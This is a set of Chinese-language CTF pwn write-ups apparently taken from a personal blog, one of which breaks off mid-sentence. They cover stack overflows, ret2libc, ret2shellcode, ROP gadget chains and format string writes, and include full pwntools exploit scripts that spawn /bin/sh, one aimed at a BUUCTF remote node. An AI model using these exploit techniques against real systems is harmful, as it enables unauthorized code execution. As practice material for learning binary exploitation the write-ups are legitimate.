[{"content":"Libcdatabase\n代码 栈溢出漏洞但是需要找到Libc库 Exp from pwn import * from LibcSearcher import * r = remote(\u0026#34;node5.buuoj.cn\u0026#34;,29369) #r = process(\u0026#34;2018_rop\u0026#34;) #libc = ELF(\u0026#34;libc6_2.23-0ubuntu11.3_i386.so\u0026#34;) elf = ELF(\u0026#34;2018_rop\u0026#34;) #if args.G: #\tgdb.attach(r, \u0026#34;b *0x0804849b\\r\\n\u0026#34;) write_plt = elf.plt[\u0026#39;write\u0026#39;] read_got = elf.got[\u0026#39;read\u0026#39;] start_addr = elf.sym[\u0026#39;main\u0026#39;] payload = \u0026#34;a\u0026#34;*140+p32(write_plt)+p32(start_addr)+p32(0x1)+p32(read_got)+p32(0x4) r.sendline(payload) # recv read read_addr = u32(r.recv(4)) print(\u0026#34;read_addr is:\u0026#34;,hex(read_addr)) libc = LibcSearcher(\u0026#39;read\u0026#39;, read_addr) # libcbase read_offset = 0x0e5620 sys_addr = 0x03cd10 bin_addr = 0x17b8cf\tbase_addr = read_addr-read_offset system_addr = base_addr+sys_addr binsh_str = base_addr+bin_addr payload = \u0026#34;a\u0026#34;*140+p32(system_addr)+p32(1)+p32(binsh_str) r.sendline(payload) r.interactive() ","permalink":"http://guozhi1.github.io/posts/pwn/buuctf2018_rop%E8%A7%A3%E9%A2%98/","summary":"Libcdatabase 代码 栈溢出漏洞但是需要找到Libc库 Exp from pwn import * from LibcSearcher import * r = remote(\u0026#34;node5.buuoj.cn\u0026#34;,29369) #r = process(\u0026#34;2018_rop\u0026#34;) #libc = ELF(\u0026#34;libc6_2.23-0ubuntu11.3_i386.so\u0026#34;) elf = ELF(\u0026#34;2018_rop\u0026#34;) #if args.G: # gdb.attach(r, \u0026#34;b *0x0804849b\\r\\n\u0026#34;) write_plt = elf.plt[\u0026#39;write\u0026#39;] read_got = elf.got[\u0026#39;read\u0026#39;] start_addr = elf.sym[\u0026#39;main\u0026#39;] payload = \u0026#34;a\u0026#34;*140+p32(write_plt)+p32(start_addr)+p32(0x1)+p32(read_got)+p32(0x4) r.sendline(payload) # recv read read_addr = u32(r.recv(4)) print(\u0026#34;read_addr is:\u0026#34;,hex(read_addr)) libc = LibcSearcher(\u0026#39;read\u0026#39;, read_addr) # libcbase read_offset = 0x0e5620 sys_addr = 0x03cd10 bin_addr = 0x17b8cf base_addr = read_addr-read_offset system_addr = base_addr+sys_addr binsh_str = base_addr+bin_addr payload = \u0026#34;a\u0026#34;*140+p32(system_addr)+p32(1)+p32(binsh_str) r.sendline(payload) r.interactive()","title":"2018_rop"},{"content":"retlibc思路 程序内不存在System函数和/bin/sh字符串, 需要通过libc来实现反弹shell\n泄露libc版本 获取libc的基地址 获取system地址和bin/sh地址 通过libc反弹shell的原理：程序在运行的时候会载入libc，libc里会有很多函数包括system和/bin/sh字符串，因为程序在开启随机地址的时候,函数的高三位是不会变的，就可以通过输出函数的地址，泄露地址的高三位判断是那个版本的libc， 然后从泄露的libc找到(puts)函数减去泄露地址的(puts)函数得到libc的基地址，得到libc的基地址就可以找到system函数和/bin/sh字符串。\nret2libc3源码 int __cdecl main(int argc, const char **argv, const char **envp) { char s[100]; // [esp+1Ch] [ebp-64h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\u0026#34;No surprise anymore, system disappeard QQ.\u0026#34;); printf(\u0026#34;Can you find it !?\u0026#34;); gets(s); return 0; } 栈溢出漏洞但是，在IDA里没有system函数和/bin/sh字符串，要想拿shell需要通过泄露libc，从libc里找到system和/bin/sh\n解题思路 在Ubuntu 16 安装LibcSearcher 解出这道题，Ubuntu 20安装LibcSearcher都是坑。 通过栈溢出泄露libc的地址，使用 r.recv(4)接收地址。\nputs_plt = elf.plt[\u0026#39;puts\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] start_addr = elf.symbols[\u0026#39;_start\u0026#39;] payload1 = \u0026#34;a\u0026#34;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got) r.sendlineafter(\u0026#34;!?\u0026#34;, payload1) puts_addr = u32(r.recv(4)) 这个是通过接收到的puts_addr放进LibcSearcher函数，第一个参数选要找的函数， 第二个放入地址 就可以得到libc版本地址\nlibc = LibcSearcher(\u0026#39;puts\u0026#39;, puts_addr) libcbase = puts_addr - libc.dump(\u0026#39;puts\u0026#39;) # libc的puts减去接收到的puts_addr 得到libc的基地址 system_addr = libcbase + libc.dump(\u0026#34;system\u0026#34;) # 获得地址 binsh_addr = libcbase + libc.dump(\u0026#34;str_bin_sh\u0026#34;) # 获得地址 payload2 = \u0026#39;a\u0026#39;*112+p32(system_addr)+\u0026#39;aaaa\u0026#39;+p32(binsh_addr) r.sendlineafter(\u0026#34;!?\u0026#34;, payload2) Exp puts_plt = elf.plt[\u0026#39;puts\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] start_addr = elf.symbols[\u0026#39;_start\u0026#39;] payload1 = \u0026#34;a\u0026#34;*112+p32(puts_plt)+p32(start_addr)+p32(puts_got) r.sendlineafter(\u0026#34;!?\u0026#34;, payload2) puts_addr = u32(r.recv(4)) print(\u0026#34;puts_addr is: \u0026#34;,hex(puts_addr)) libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts_addr) libcbase = puts_addr - libc.dump(\u0026#39;puts\u0026#39;) system_addr = libcbase + libc.dump(\u0026#34;system\u0026#34;) binsh_addr = libcbase + libc.dump(\u0026#34;str_bin_sh\u0026#34;) payload2 = \u0026#39;a\u0026#39;*112+p32(system_addr)+\u0026#39;aaaa\u0026#39;+p32(binsh_addr) r.sendlineafter(\u0026#34;!?\u0026#34;, payload2) r.interactive() ","permalink":"http://guozhi1.github.io/posts/pwn/ret2libc3/","summary":"retlibc思路 程序内不存在System函数和/bin/sh字符串, 需要通过libc来实现反弹shell 泄露libc版本 获取libc的基地址 获取system地址和bin/sh地址 通过libc反弹shell的原理：程序在运行的时候会载入libc，libc里会有很多函数包括syst","title":"Ret2libc3"},{"content":"格式化字符串漏洞 格式化字符串漏洞是发现比较晚的漏洞，产生的原因是因为 ，格式化函数把用户输入的格式化字符，当做了解析自身的格式化字符做了解析。\n常见的格式化漏洞函数 各种print函数\n格式化字符 %s 打印字符串 %p 打印地址 %c 打印char字符 %n 输入字符\n%10c 这代表10个制表符（空格）\nprintf(\u0026#34;guozhi%10s\u0026#34;, \u0026#34;格式化字符\u0026#34;) guozhi 格式化字符 %2$s 这个代表占位符\nprintf(\u0026#34;%2$s guozhi %1$s\u0026#34;, \u0026#34;第一个参数\u0026#34;, \u0026#34; 第二个参数\u0026#34;); 输出： 第二个参数 guozhi 第一个参数 这就产生了一个问题如果参数不足的情况下 %3$会输出什么？\n会，接着往下输出如果是x86则会输出栈上的内容， 如果是x64会先泄露前六个寄存器的内容然后再泄露栈上的内容，这就会造成栈内存泄露。\n当然泄露栈内存空间不会有太大危害， 需要配合另一个格式化字符串进行写入操作。\n%n 往里写东西不过写入的地址必须是被指向的如\n01:0004│-054 0xffffd0b4 —▸ 0xffffd0e8 ◂— 0x61616161 (\u0026#39;aaaa\u0026#39;) 这样的指针就可以进行修改 %100c%x$n x代表它的栈上的第几个，需要通过计算获得。\n如何没有指向我们想修改的的地址怎么办？\n可以通过写入地址的方式把想要修改的地址写进去但是， 如果是x86可以把地址写在前面(0xffffd0e8%96c%x$n地址再前面注意内存对齐), 但是x64就不行因为高地址是00读到00就会被截断所以地址要放到后面(%100c%x$n0x7fffffffdf10)\n如果修改成功\n01:0004│-054 0xffffd0b4 —▸ 0xffffd0e8 ◂— 0x64 /* \u0026#39;d\u0026#39; */ 代码分析 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int test1; int init_func(){ setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); return 0; } int dofunc(){ char buf1[0x10]; char buf2[0x10]; char buf3[0x10]; int test2=0; int test3=0; while(1){ puts(\u0026#34;input:\u0026#34;); read(0,buf1,0x100); printf(buf1); if(test3==100) system(\u0026#34;/bin/sh\u0026#34;); } return 0; } int main(){ init_func(); dofunc(); return 0; } //gcc fmt_test_2.c -o fmt_test_2_x64 //gcc -m32 fmt_test_2.c -o fmt_test_2_x86 这个题需要test3 == 100 会触发system 函数， 但是test3的变量被写死再代码里无法进行修改。 但是上方有一个printf函数临近我们可以通过printf 函数向栈中写test3地址的内容。\n首先确定获取到栈底ebp的地址然后通过偏移来寻test3的地址\nebp是\nEBP 0xffffd108 —▸ 0xffffd118 ◂— 0x0 EBP是0xffffd108 然后通过%p来寻址看看偏移是多少\n%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p 这样就可以判断看出第几个偏移是栈底了\n0xffffd0e8,0x100,0x56556246,0xf7faf224,0x56559000,0xf7fb1000,0xf7fb1000,0xffffd108,0xf7fe7ae4,0xffffd144,0x56559000,0xf7fb1000,0xf7fb1000,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70 第8个偏移就是栈底了也就是%8$p\n然后是确定test3的栈地址。\n先查看是什么汇编\n0x56556291 \u0026lt;dofunc+87\u0026gt; cmp dword ptr [ebp - 0x10], 0x64 是ebp-0x10就是test的栈偏移了，哪就可以用上面得到栈ebp的地址0x10得到test3的偏移，通过%n写入100即可完成。\n如何计算出%n的偏移？\n可以通过aaaa%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p 看0x61616161再哪出现，第几个就是多少偏移。\nEXP from pwn import * r = process(\u0026#34;fmt_test_2_x86\u0026#34;) raw_input() r.recvline(\u0026#34;input:\u0026#34;) r.send(\u0026#34;%8$p\u0026#34;) ebp_addr = int(r.recv()[2:10],16) print(ebp_addr) #r.recvline(\u0026#34;input:\u0026#34;) test3_addr = ebp_addr - 0x10 payload = p32(test3_addr) + b\u0026#34;%96c%14$hhn\u0026#34; print(\u0026#34;ebp_addr is:\u0026#34;+hex(ebp_addr)) print(\u0026#34;test3_addr is:\u0026#34;+hex(test3_addr)) r.send(payload) r.interactive() x64EXP x64需要注意\n算上寄存器的空间 地址写在后面 from pwn import * r = process(\u0026#34;fmt_test_2_x64\u0026#34;) raw_input() r.recvline(\u0026#34;input:\u0026#34;) r.send(\u0026#34;%9$p\u0026#34;) ebp_addr = int(r.recv()[2:14],16) print(\u0026#34;ebp_addr is:\u0026#34;,hex(ebp_addr)) test3_addr = ebp_addr - 0x8 print(\u0026#34;test3_addr is:\u0026#34;,hex(test3_addr)) r.recvline(\u0026#34;input:\u0026#34;) payload = \u0026#34;%100c%12$hhnaaaa\u0026#34;+p64(test3_addr) r.send(payload) r.interactive() ","permalink":"http://guozhi1.github.io/posts/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/","summary":"格式化字符串漏洞 格式化字符串漏洞是发现比较晚的漏洞，产生的原因是因为 ，格式化函数把用户输入的格式化字符，当做了解析自身的格式化字符做了解析。 常见的格式化漏洞函数 各种print函数 格式化字符 %s 打印字符串 %p 打印地址 %c 打印char字符 %n 输入字符 %10c 这代表10个制表符（空格） printf(\u0026#34;guozhi%10s\u0026#34;, \u0026#34;格","title":"格式化字符串漏洞基础"},{"content":"1. 源码分析 ","permalink":"http://guozhi1.github.io/posts/pwn/rop%E4%B8%AD%E7%BA%A7/","summary":"1. 源码分析","title":"ROP中级"},{"content":"1. 溢出数据该填多长 并不是所有栈rsp到rbp的存放一个变量，有的栈溢出是从中间开始的覆盖到rbp要计算更为精准的计算栈溢出是尤为重要的\n2. 源码分析 int __cdecl main(int argc, const char **argv, const char **envp) { char s[100]; // [esp+1Ch] [ebp-64h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\u0026#34;There is something amazing here, do you know anything?\u0026#34;); gets(s); printf(\u0026#34;Maybe I will tell you next time !\u0026#34;); return 0; } 如何计算s溢出所需的大小 使用Gdb 下断点到gets这个函数\n00:0000│ esp 0xffffd100 —▸ 0xffffd11c ◂— \u0026#39;aaaaaaa\u0026#39; 01:0004│-084 0xffffd104 ◂— 0x0 02:0008│-080 0xffffd108 ◂— 0x1 03:000c│-07c 0xffffd10c ◂— 0x0 ... ↓ 2 skipped 06:0018│-070 0xffffd118 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x2bf24 07:001c│ eax 0xffffd11c ◂— \u0026#39;aaaaaaa\u0026#39; 08:0020│ edx-3 0xffffd120 ◂— 0x616161 /* \u0026#39;aaa\u0026#39; */ 09:0024│-064 0xffffd124 ◂— 0x1 0a:0028│-060 0xffffd128 ◂— 0x1000 0b:002c│-05c 0xffffd12c —▸ 0xffffd22c —▸ 0xffffd3f1 ◂— \u0026#39;SHELL=/bin/bash\u0026#39; 0c:0030│-058 0xffffd130 —▸ 0xf7fb1224 (__elf_set___libc_subfreeres_element_free_mem__) —▸ 0xf7f3a870 (free_mem) ◂— endbr32 0d:0034│-054 0xffffd134 ◂— 0x80000 0e:0038│-050 0xffffd138 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c 0f:003c│-04c 0xffffd13c —▸ 0xf7fb64e8 (__exit_funcs_lock) ◂— 0x0 10:0040│-048 0xffffd140 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c 11:0044│-044 0xffffd144 —▸ 0xf7fe22b0 (_dl_fini) ◂— endbr32 12:0048│-040 0xffffd148 ◂— 0x0 13:004c│-03c 0xffffd14c —▸ 0x8048425 (_init+9) ◂— add ebx, 0x1bdb 14:0050│-038 0xffffd150 —▸ 0xf7fb33fc (__exit_funcs) —▸ 0xf7fb4180 (initial) ◂— 0x0 15:0054│-034 0xffffd154 ◂— 0x1 16:0058│-030 0xffffd158 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f14 (_DYNAMIC) ◂— 0x1 17:005c│-02c 0xffffd15c —▸ 0x8048722 (__libc_csu_init+82) ◂— add edi, 1 18:0060│-028 0xffffd160 ◂— 0x1 19:0064│-024 0xffffd164 —▸ 0xffffd224 —▸ 0xffffd3d4 ◂— 0x6d6f682f (\u0026#39;/hom\u0026#39;) 1a:0068│-020 0xffffd168 —▸ 0xffffd22c —▸ 0xffffd3f1 ◂— \u0026#39;SHELL=/bin/bash\u0026#39; 1b:006c│-01c 0xffffd16c —▸ 0xf7dfc469 (__cxa_atexit+41) ◂— add esp, 0x1c 1c:0070│-018 0xffffd170 —▸ 0xf7fe22b0 (_dl_fini) ◂— endbr32 1d:0074│-014 0xffffd174 ◂— 0x0 1e:0078│-010 0xffffd178 —▸ 0x80486db (__libc_csu_init+11) ◂— add ebx, 0x1925 1f:007c│-00c 0xffffd17c ◂— 0x0 20:0080│-008 0xffffd180 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c 21:0084│-004 0xffffd184 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c 22:0088│ ebp 0xffffd188 ◂— 0x0 可以看到是从0xffffd11存储这s的值，计算溢出需要计算ebp到0xffffd11这之间的长度 从这个可以看到0d:0034│-054 0xffffd134 ◂— 0x80000\n0x54（偏移量）+（栈帧大小）0x4 = 0x6c(0xffffd11的溢出大小)\n0x6c+0x4(RBP的栈帧大小) + ret (要跳转的地址)\n3. Exp构造 from pwn import * r = process(\u0026#34;./ret2text\u0026#34;) raw_input() addr = 0x804863a p = b\u0026#34;A\u0026#34;*(0x6c+0x4)+p32(addr) r.recvuntil(\u0026#39;anything?\\n\u0026#39;) r.sendline(p) r.interactive() ","permalink":"http://guozhi1.github.io/posts/pwn/%E6%A0%88%E6%BA%A2%E5%87%BAret2text%E5%AF%BB%E6%89%BE%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6/","summary":"1. 溢出数据该填多长 并不是所有栈rsp到rbp的存放一个变量，有的栈溢出是从中间开始的覆盖到rbp要计算更为精准的计算栈溢出是尤为重要的 2. 源码分析 int __cdecl main(int argc, const char **argv, const char **envp) { char s[100]; // [esp+1Ch] [ebp-64h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\u0026#34;There is something amazing here, do you know anything?\u0026#34;); gets(s); printf(\u0026#34;Maybe I will tell you next time !\u0026#34;); return 0; } 如何计算s溢出所需的大小 使用Gdb 下断点到g","title":"栈溢出ret2text寻找溢出长度"},{"content":"1. ROP介绍 栈溢出大家都打过吧， 栈溢出通过Ret返回到黑客输入的shellcode处执行。但是不是所有有栈溢出漏洞的程序都有写shellcode的权限。有的程序有但是Date段和Text段也不会有执行权限，这个时候就需要通过程序内中的已有的汇编指令来进行拼接实现Shellcode功能。\nroptest 1.1 题目分析 int main(){ char name[16]; read(0,name,128); } int foo(){ return open(\u0026#34;/flag\u0026#34;, 0); } int bar(){ int x = open(\u0026#34;/notflag\u0026#34;, 0); sendfile(1,x,0,1024); } read是一个溢出点，但是但是没有能直接读取/flag。 sendfile()可以但是读的变量 是x这个时候就需要通过 操控栈来让程序执行open(\u0026quot;/flag\u0026quot;, 0) 之后可以通过sendfile() 函数来读取/flag\n像搭积木一样把函数再内存中进行拼装。\n编译它\ngcc -fno-stack-protector -no-pie -o roptest roptest.c 关闭了程序地址随机化(PIE) 关闭了金丝雀 这不是这期的重点，重点是学习ROP，不是绕过防御机制。\n攻击链路\n通过栈溢出 \u0026mdash;\u0026gt; 执行open(/flag) ret到 \u0026mdash;\u0026gt; sendfile() 函数 \u0026mdash;\u0026gt; 得到flag 文件\n这是objdump 反编译的重要函数 读注释的代码\n0000000000401176 \u0026lt;main\u0026gt;: 401176:\tf3 0f 1e fa endbr64 40117a:\t55 push rbp //8个字节 40117b:\t48 89 e5 mov rbp,rsp 40117e:\t48 83 ec 10 sub rsp,0x10 401182:\t48 8d 45 f0 lea rax,[rbp-0x10] //Name变量 16 个字节 401186:\tba 80 00 00 00 mov edx,0x80 40118b:\t48 89 c6 mov rsi,rax 40118e:\tbf 00 00 00 00 mov edi,0x0 401193:\tb8 00 00 00 00 mov eax,0x0 401198:\te8 c3 fe ff ff call 401060 \u0026lt;read@plt\u0026gt; // 溢出点 8+16溢出点 40119d:\tb8 00 00 00 00 mov eax,0x0 4011a2:\tc9 leave 4011a3:\tc3 ret //跳到OPen(/flag ) 0x4011ac 00000000004011a4 \u0026lt;foo\u0026gt;: 4011a4:\tf3 0f 1e fa endbr64 4011a8:\t55 push rbp 4011a9:\t48 89 e5 mov rbp,rsp 4011ac:\tbe 00 00 00 00 mov esi,0x0 //open的0参数 4011b1:\t48 8d 3d 4c 0e 00 00 lea rdi,[rip+0xe4c] //这是/flag字符串 # 402004 \u0026lt;_IO_stdin_used+0x4\u0026gt; 4011b8:\tb8 00 00 00 00 mov eax,0x0 //预设返回值 4011bd:\te8 be fe ff ff call 401080 \u0026lt;open@plt\u0026gt; 4011c2:\t5d pop rbp //做填充 4011c3:\tc3 ret // 跳转到0x4011ec sendfile函数来读取Flag 00000000004011c4 \u0026lt;bar\u0026gt;: 4011c4:\tf3 0f 1e fa endbr64 4011c8:\t55 push rbp 4011c9:\t48 89 e5 mov rbp,rsp 4011cc:\t48 83 ec 10 sub rsp,0x10 4011d0:\tbe 00 00 00 00 mov esi,0x0 4011d5:\t48 8d 3d 2e 0e 00 00 lea rdi,[rip+0xe2e] # 40200a \u0026lt;_IO_stdin_used+0xa\u0026gt; 4011dc:\tb8 00 00 00 00 mov eax,0x0 4011e1:\te8 9a fe ff ff call 401080 \u0026lt;open@plt\u0026gt; 4011e6:\t89 45 fc mov DWORD PTR [rbp-0x4],eax 4011e9:\t8b 45 fc mov eax,DWORD PTR [rbp-0x4] 4011ec:\tb9 00 04 00 00 mov ecx,0x400 //0x400 = 1024 4011f1:\tba 00 00 00 00 mov edx,0x0 4011f6:\t89 c6 mov esi,eax 4011f8:\tbf 01 00 00 00 mov edi,0x1 4011fd:\tb8 00 00 00 00 mov eax,0x0 401202:\te8 69 fe ff ff call 401070 \u0026lt;sendfile@plt\u0026gt; //执行到这个函数成功的读取Flag文件 401207:\t90 nop 401208:\tc9 leave 401209:\tc3 ret 40120a:\t66 0f 1f 44 00 00 nop WORD PTR [rax+rax*1+0x0] 2 EXP from pwn import * r = process(\u0026#34;./RopTest\u0026#34;) r.send(#填充 name b\u0026#34;a\u0026#34;*16+ #填充 rbp b\u0026#34;b\u0026#34; * 8+ #填充 rip p64(0x4011ac)+ #填充 pop rbp b\u0026#39;c\u0026#39;*8+ # 填充 foo ret p64(0x4011ec) ) #print(r.readall()) r.interactive() ret2shellcode 1. 源码分析 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\u0026#34;No system for you this time !!!\u0026#34;); gets((char *)\u0026amp;v4); //栈溢出点 strncpy(buf2, (const char *)\u0026amp;v4, 0x64u); //shellcode 复制到Buf2 printf(\u0026#34;bye bye ~\u0026#34;); return 0; } 这道题是溢出写shellcode int v4是局部变量不会有固定的地址\nstrncpy 函数 0x804a080 的地址是buf2 变量的这样V4被复制到Buf2中shellcode就有了一个固定的地址\n8048598:\tc7 44 24 08 64 00 00 mov DWORD PTR [esp+0x8],0x64 804859f:\t00 80485a0:\t8d 44 24 1c lea eax,[esp+0x1c] 80485a4:\t89 44 24 04 mov DWORD PTR [esp+0x4],eax 80485a8:\tc7 04 24 80 a0 04 08 mov DWORD PTR [esp],0x804a080 80485af:\te8 6c fe ff ff call 8048420 \u0026lt;strncpy@plt\u0026gt; 2. 构建Exp v4 大小是100\n07:001c│ eax 0xffffd0dc ◂— \u0026#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#39; ... ↓ 24 skipped 20:0080│ edx 0xffffd140 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c 21:0084│-004 0xffffd144 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c 22:0088│ ebp 0xffffd148 ◂— 0x0 可以看到下面两位被got表占了不知道为什么 再填充 8byte 覆盖ebp 再加 4byte\n100 + 8 + 4 = 112 byte\nfrom pwn import * r = process(\u0026#39;./ret2shellcode\u0026#39;) raw_input() sddaddr = 0x804a080 shell = asm(shellcraft.sh()) print(len(shell)) print(shell.ljust(0x70,b\u0026#39;A\u0026#39;)+p32(sddaddr)) r.recvuntil(\u0026#39;!!!\u0026#39;) r.sendline(shell.ljust(0x70,b\u0026#39;A\u0026#39;)+p32(sddaddr)) r.interactive() 因为不知道shellcode的长度所以使用 ljust函数来填充如果shellcode长度不够就用A来填充\nret2syscall 源码分析 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\u0026#34;This time, no system() and NO SHELLCODE!!!\u0026#34;); puts(\u0026#34;What do you plan to do?\u0026#34;); gets(\u0026amp;v4); return 0; } 这道题通过程序内已有的汇编代码从获取shell 需要截取gadget片段 控制程序流从而获得shell\ngadge片段是指 操作寄存距离ret 操作数近的汇编指令 如 pop eax ; ret\nexecve(\u0026#34;/bin/sh\u0026#34;, NULL,NULL) execve的系统调用号 eax 0xb 第一个参数 ebx 执行\u0026quot;/bin/sh\u0026quot; 第二个参数指向 ecx 为 0 第三个参数执行 edx 为 0 然后通过gadge 片段去操控寄存器 流程这样的 把栈上的数据pop 到寄存修改完几个寄存器 跳到int 0x80 执行execve就会成功调用shell\n通过ROPgadge 工具寻找可用gadge片段\nguozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ ROPgadget --binary ./rop --only \u0026#34;pop|ret\u0026#34; | grep \u0026#39;eax\u0026#39; 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x080bb196 : pop eax ; ret 0x0807217a : pop eax ; ret 0x80e 0x0804f704 : pop eax ; ret 3 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ ROPgadget --binary ./rop --only \u0026#34;pop|ret\u0026#34; | grep \u0026#39;edx\u0026#39; 0x0806eb69 : pop ebx ; pop edx ; ret 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 0x0806eb6a : pop edx ; ret 0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ ROPgadget --binary ./rop --string \u0026#39;/bin/sh\u0026#39; Strings information ============================================================ 0x080be408 : /bin/sh guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ ROPgadget --binary ./rop --only \u0026#39;int\u0026#39; Gadgets information ============================================================ 0x08049421 : int 0x80 Unique gadgets found: 1 guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ 构造exp from pwn import * r = process(\u0026#39;./rop\u0026#39;) pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 sh = 0x080be408 int_0x80 = 0x08049421 p = flat( [\u0026#39;a\u0026#39;*112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0,0,sh,int_0x80] ) r.sendline(p) r.interactive() ret2libc2 1.源码分析 存在system函数但是不存在/bin/sh字符串所以需要自己往里写, 往程序里写东西可用通过再次触发gets函数往指定的地址写东西，然后触发system函数。\nint __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp-68h] [ebp-68h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\u0026#34;Something surprise here, but I don\u0026#39;t think it will work.\u0026#34;); printf(\u0026#34;What do you think ?\u0026#34;); gets(\u0026amp;v4); return 0; } 2.构建Exp from pwn import * r = process(\u0026#39;./ret2libc2\u0026#39;) system_plt = 0x8048490 gets_plt = 0x8048460 pop_ebx_ret = 0x0804843d buf = 0x804AF00 #看程序权限vmmap哪可以往里写就写哪 sh = b\u0026#39;/bin/sh\u0026#39; p = flat( [\u0026#39;a\u0026#39;*112, # 溢出填充 gets_plt, # 接收sh pop_ebx_ret, buf, # 接收的参数弹到ebx寄存中 system_plt, #调用systemcall \u0026#39;c\u0026#39;*4, #垃圾数据填充systemcall第一个参数 buf#作为地址提交 ] ) r.sendline(p) r.sendline(sh) r.interactive() ","permalink":"http://guozhi1.github.io/posts/pwn/rop%E5%9F%BA%E7%A1%80/","summary":"1. ROP介绍 栈溢出大家都打过吧， 栈溢出通过Ret返回到黑客输入的shellcode处执行。但是不是所有有栈溢出漏洞的程序都有写shellcode的权限。有的程序有但是Date段和Text段也不会有执行权限，这个时候就需要通过程序内中的已有的汇编指令来进行拼接实现Shellcode","title":"ROP基础"},{"content":"1.1 分析源码 先看下保护措施\n[*] \u0026#39;/home/guozhi/桌面/pwn1\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO GOT表写保护 Stack: No canary found 无金丝雀保护 NX: NX unknown - GNU_STACK missing 内存页 无不可执行保护 PIE: No PIE (0x400000) 无地址随机化 Stack: Executable 栈可执行 RWX: Has RWX segments 有可读可写可执行 int __cdecl main(int argc, const char **argv, const char **envp) { char s[15]; // [rsp+1h] [rbp-Fh] BYREF puts(\u0026#34;please input\u0026#34;); gets((__int64)s, (__int64)argv); //主要是这里产生了溢出gets不会限制输入长度 puts(s); puts(\u0026#34;ok,bye!!!\u0026#34;); return 0; } 可以通过objdump来分析汇编\nobjdump -d pwn1 -Mintel 0000000000401142 \u0026lt;main\u0026gt;: 401142:\t55 push rbp 401143:\t48 89 e5 mov rbp,rsp 401146:\t48 83 ec 10 sub rsp,0x10 40114a:\t48 8d 3d b3 0e 00 00 lea rdi,[rip+0xeb3] # 402004 \u0026lt;_IO_stdin_used+0x4\u0026gt; 401151:\te8 da fe ff ff call 401030 \u0026lt;puts@plt\u0026gt; 401156:\t48 8d 45 f1 lea rax,[rbp-0xf] 40115a:\t48 89 c7 mov rdi,rax 40115d:\tb8 00 00 00 00 mov eax,0x0 401162:\te8 e9 fe ff ff call 401050 \u0026lt;gets@plt\u0026gt; 401167:\t48 8d 45 f1 lea rax,[rbp-0xf] 40116b:\t48 89 c7 mov rdi,rax 40116e:\te8 bd fe ff ff call 401030 \u0026lt;puts@plt\u0026gt; 401173:\t48 8d 3d 97 0e 00 00 lea rdi,[rip+0xe97] # 402011 \u0026lt;_IO_stdin_used+0x11\u0026gt; 40117a:\te8 b1 fe ff ff call 401030 \u0026lt;puts@plt\u0026gt; 40117f:\tb8 00 00 00 00 mov eax,0x0 401184:\tc9 leave 401185:\tc3 ret 0000000000401186 \u0026lt;fun\u0026gt;: 401186:\t55 push rbp 401187:\t48 89 e5 mov rbp,rsp 40118a:\t48 8d 3d 8a 0e 00 00 lea rdi,[rip+0xe8a] # 40201b \u0026lt;_IO_stdin_used+0x1b\u0026gt; 401191:\te8 aa fe ff ff call 401040 \u0026lt;system@plt\u0026gt; 401196:\t90 nop 401197:\t5d pop rbp 401198:\tc3 ret 401199:\t0f 1f 80 00 00 00 00 nop DWORD PTR [rax+0x0] 可以看到Fun方法中存在System 函数可以用来执行命令 objdump 分析出了rdi,[rip+0xe8a]的位置是0x40201b 可用通过Pwndbg 